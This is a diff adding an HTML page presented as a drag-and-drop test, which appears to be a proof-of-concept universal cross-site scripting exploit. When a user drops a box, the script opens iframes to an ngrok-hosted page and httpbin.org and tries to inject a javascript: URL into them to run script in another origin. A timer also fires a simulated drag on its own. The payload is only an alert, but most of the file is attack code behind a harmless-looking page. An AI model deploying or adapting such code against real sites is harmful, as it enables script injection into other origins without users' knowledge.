@@ -1,0 +1,101 @@
+<html>
+<body>
+<style>
+.draggable {
+    width: 100px;
+    height: 100px;
+    background: #4CAF50;
+    color: white;
+    padding: 10px;
+    margin: 10px;
+    cursor: move;
+}
+
+#drop-zone {
+    position: fixed;
+    top: 0;
+    right: 0;
+    width: 100px;
+    height: 100%;
+    background: rgba(255,0,0,0.1);
+    border: 2px dashed red;
+}
+</style>
+
+<div class="draggable" draggable="true" id="drag1">Drag me!</div>
+<div class="draggable" draggable="true" id="drag2">Or drag me!</div>
+
+<div id="drop-zone">Drop Zone</div>
+
+<script>
+// Setup drag and drop events
+const draggables = document.querySelectorAll('.draggable');
+const dropZone = document.getElementById('drop-zone');
+
+draggables.forEach(draggable => {
+    draggable.addEventListener('dragstart', function(e) {
+        e.dataTransfer.setData('text/plain', e.target.id);
+        console.log("[+] Drag started");
+    });
+});
+
+dropZone.addEventListener('dragover', function(e) {
+    e.preventDefault();
+    console.log("[+] Drag over drop zone");
+});
+
+dropZone.addEventListener('drop', function(e) {
+    e.preventDefault();
+    const id = e.dataTransfer.getData('text/plain');
+    console.log(`[+] Drop detected: ${id}`);
+    
+    // Trigger UXSS pada drop gesture
+    triggerDragDropUXSS();
+});
+
+function triggerDragDropUXSS() {
+    console.log("[+] Drag & Drop UXSS activated");
+    
+    // Exploit HTML5 drag & drop features
+    const targets = [
+        'https://megathermic-nonconcentrative-gianna.ngrok-free.dev/new.html',
+        'https://httpbin.org'
+    ];
+    
+    targets.forEach((target, index) => {
+        setTimeout(() => {
+            // Create draggable iframe untuk exploitation
+            const iframe = document.createElement('iframe');
+            iframe.draggable = true;
+            iframe.src = target;
+            iframe.style.width = '100px';
+            iframe.style.height = '100px';
+            document.body.appendChild(iframe);
+            
+            // Attempt to exploit loaded iframe
+            setTimeout(() => {
+                try {
+                    iframe.contentWindow.location = 'javascript:alert("Drag & Drop UXSS")';
+                } catch(e) {
+                    console.log("[-] Iframe exploitation failed");
+                }
+            }, 2000);
+        }, index * 1000);
+    });
+}
+
+// Auto-drag simulation untuk automated testing
+setTimeout(() => {
+    console.log("[+] Auto-drag simulation");
+    const event = new DragEvent('dragstart', {
+        dataTransfer: new DataTransfer()
+    });
+    document.getElementById('drag1').dispatchEvent(event);
+}, 5000);
+</script>
+
+<h1>Drag & Drop Test</h1>
+<p>Drag any green box to the red drop zone on the right</p>
+
+</body>
+</html>
